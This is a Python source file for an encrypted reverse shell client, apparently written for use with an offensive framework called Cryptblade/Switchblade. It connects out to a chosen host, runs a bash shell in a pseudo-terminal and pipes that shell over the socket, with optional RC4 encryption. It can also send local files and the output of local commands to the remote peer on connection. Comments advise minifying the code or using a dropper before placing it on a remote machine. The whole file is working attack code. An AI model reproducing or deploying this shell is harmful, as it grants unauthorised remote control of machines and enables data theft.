#!/usr/bin/env python
import argparse

import os
import pty
import socket
import subprocess

import select
import threading

# BUG: If the client and server send data at the same time while using a stream cipher, the result will be corrupted (as it is a race condition)
#  SOLUTION: Maintain a separate stream cipher state for each direction? Both parties must agree to this

# An example implementation of encrypted reverse shells known to be compatible with Cryptblade / Switchblade.
# You should modify / minify this (or use a dropper) and remove dependencies instead of putting it directly on remote client.
class RevShell:
    def __init__(self, args):
        self.args = args
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        if self.args.verbosity > 1:
            print("Connecting to {}:{}".format(self.args.host, self.args.port))
        self.sock.connect((self.args.host, self.args.port))
        self.sock.setblocking(0)
        if self.args.welcome_msg:
            #os.write(self.master, self.args.welcome_msg.encode()) 
            self.send(self.args.welcome_msg.encode())
        if self.args.welcome_file:
            with open(self.args.welcome_file, 'rb') as f:
                #os.write(self.master, f.read()) 
                self.send(f.read())
        if self.args.welcome_cmd:
            output = subprocess.check_output(self.args.welcome_cmd, stderr=subprocess.STDOUT, shell=True)
            #os.write(self.master, output) 
            self.send(output)



    @staticmethod
    def get_parser():
        parser = argparse.ArgumentParser(description='An example reverse shell thrower that supports encryption.')
        parser.add_argument('-s', '--shell', default='/bin/bash', help="The command to spawn the desired shell. Default is /bin/bash.")

        parser.add_argument('-e', '--encrypt', help="Encrypt / decrypt communications using this algorithm. Must be one of: [rc4]")
        parser.add_argument('-k', '--key', help="Encrypt communications using this key / keyfile (depending on the algoritm). Use with -e (--encrypt).")

        parser.add_argument('-w', '--welcome_msg', help="A message (*cough* command *cough*) That should be sent to the peer machine upon connection. Can be combined with -f and -s")
        parser.add_argument('-f', '--welcome_file', help="A file that should be sent to the peer machine upon connection. Can be combined with -w and -s.")
        parser.add_argument('-c', '--welcome_cmd', help="A shell command that should be executed locally upon connection. The output is sent to the peer machine. Can be combined with -w and -f." +
                                                        "  Strings {RHOST} and {RPORT} in welcome_cmd will be replaced with the local IP address and the local port used by this client.")
        parser.add_argument('-q', '--quit', action="store_true", help="If set, quit after running the welcome_* commands")
        parser.add_argument('-u', '--udp', action="store_true", help="Use UDP instead of TCP. [NOT IMPLEMENTED]")
        parser.add_argument("-v", "--verbosity", default=0, action="count", help="Level of verbosity. Use -vv or -vvv for additional verbosity")
        parser.add_argument("host", help="The IP address of the machine that is listening for a connection.")
        parser.add_argument('port', default=443, type=int, help="The listening port to connect to. The default is 443")

        return parser


    def _send(self, msg):
        self.sock.send(msg)
        
    def send(self, msg):
        if self.args.encrypt:
            msg = self.encrypt(msg)
        self._send(msg)

    def _recv(self):
        data = ''
        try:
            data = self.sock.recv(1024)
            
            if self.args.verbosity > 2:
                print("Read 1")
            data_left = self.sock.recv(1024)
            if self.args.verbosity > 2:
                print("Read 2")
            while data_left:
                data += data_left
                data_left = self.sock.recv(1024)
        except Exception as e:
            if self.args.verbosity > 0:
                print(e)
        return data
    
    def recv(self):
        msg = self._recv()
        if self.args.encrypt:
            msg = self.decrypt(msg)
        return msg

    def _read(self):
        while self.shell.poll() is None:  # While bash is alive
            r, w, e = select.select([self.master], [], [])  # Wait for data that is ready for sending
            if self.master in r:
                if self.args.verbosity > 0:
                    print("Shell has data")
                data = os.read(self.master, 2048)
                if self.args.verbosity > 1:
                    print("Read: {}".format(data))
                #data = self.encrypt(data)
                #if self.args.verbosity > 1:
                #    print("Encrypted: {}".format(data))
                #    print("Sending {} chars".format(len(data)))
                self.send(data)

    def _crypt(self, msg, direction=False):
            if self.args.encrypt:
                # Should throw AttributeError on failure
                try:
                    msg = getattr(self, self.args.encrypt)(msg, decrypt=direction)
                except AttributeError as e:
                    print("Encryption algorithm {} is not supported. Exiting.".format(self.args.encrypt))
                    os._exit(1)
            return msg

    def encrypt(self, msg):
        return self._crypt(msg, False)
    def decrypt(self, msg):
        return self._crypt(msg, True)

    def start(self):
        if self.args.quit:
            return
        # Spawn a PTY
        self.master, self.slave = pty.openpty()
        # Run bash inside it
        self.shell = subprocess.Popen(self.args.shell,
                                preexec_fn=os.setsid,
                                stdin=self.slave,
                                stdout=self.slave,
                                stderr=self.slave,
                                universal_newlines=True,
                                shell=True)

        shell_thread = threading.Thread(target=self._read)
        shell_thread.daemon = True
        shell_thread.start()

        try:
            while self.shell.poll() is None:  # While bash is alive
                r, w, e = select.select([self.sock], [], [])  # Wait for data on either the socket or the PTY

                if self.sock in r:
                    if self.args.verbosity > 0:
                        print("Socket has data")
                    data = self.recv() 
                    if not data:  # End of file.
                        break
                    if self.args.verbosity > 1:
                        print("Received {} chars".format(len(data)))
                        print("Writing: {}".format(data))
                    os.write(self.master, data)
        finally:
            self.sock.close()
###########################################################
# RC4

    def _rc4_setup(self, key, state):
        key = [ord(c) for c in key]
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]

        # Store the current crypto state for later
        state.update({'key':key, 'S':S, 'i':0, 'j':0})

    def _rc4_prga(self, state):
        # Restore state of the crypto algorithm
        S, i, j = [state[x] for x in ['S','i','j']]
        #print(S, i, j)
        while True:
            #print(S, i, j)
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            next_key = S[(S[i] + S[j]) % 256]
            #print(next_key)
            yield next_key

    def rc4(self, msg, decrypt=False):
        if not hasattr(self, '_crypto'):
            self._crypto = {True:{}, False:{}}
        # Maintain two keystream states, one for each direction.
        # Use convention that encrypt direction uses the reverse of the key
        #   to reduce key reuse. The peer must reverse the key for the decrypt direction
        state = self._crypto[decrypt]
        if not 'rc4_prga' in state:
            key = self.args.key
            if not decrypt:
                key = key[::-1]
            self._rc4_setup(key, state)
            state['rc4_prga'] = self._rc4_prga(state)
        msg = [ord(c) if not type(c) is int else c for c in msg]
        output = bytearray()
        for msgbyte, keybyte in zip(msg, state['rc4_prga']):
            output.append(msgbyte ^ keybyte)
        return output
###########################################################

if __name__ == "__main__":
    parser = RevShell.get_parser()
    rev = RevShell(parser.parse_args())
    rev.start()

